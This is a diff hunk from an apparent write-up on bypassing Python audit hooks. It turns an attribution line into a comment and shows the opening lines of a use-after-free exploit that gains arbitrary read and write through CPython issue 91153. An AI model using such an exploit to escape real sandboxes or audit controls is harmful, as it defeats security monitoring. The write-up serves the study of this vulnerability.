@@ -89,7 +89,7 @@ By using <https://github.com/python/cpython/issues/91153>, we can overwrite audi
 ### Exploits
 ```python
 # following arbitery reading/writing exploit code from https://github.com/python/cpython/issues/91153#issuecomment-1132117665
-by chilaxan
+# by chilaxan
 to_write_after_free = bytearray(bytearray.__basicsize__)
 class sneaky:
     def __index__(self):
